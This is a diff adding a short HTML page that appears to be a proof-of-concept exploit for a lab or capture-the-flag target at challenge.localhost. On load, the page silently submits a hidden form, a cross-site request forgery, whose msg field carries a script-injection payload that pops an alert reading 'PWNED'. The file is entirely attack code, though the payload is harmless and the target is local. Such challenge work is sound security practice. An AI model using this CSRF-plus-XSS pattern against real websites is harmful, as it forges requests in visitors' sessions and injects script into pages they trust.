@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form id="csrf-form" action="http://challenge.localhost/ephemeral" method="GET">
+      <input type="hidden" name="msg" value="<script>alert('PWNED')</script>">
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
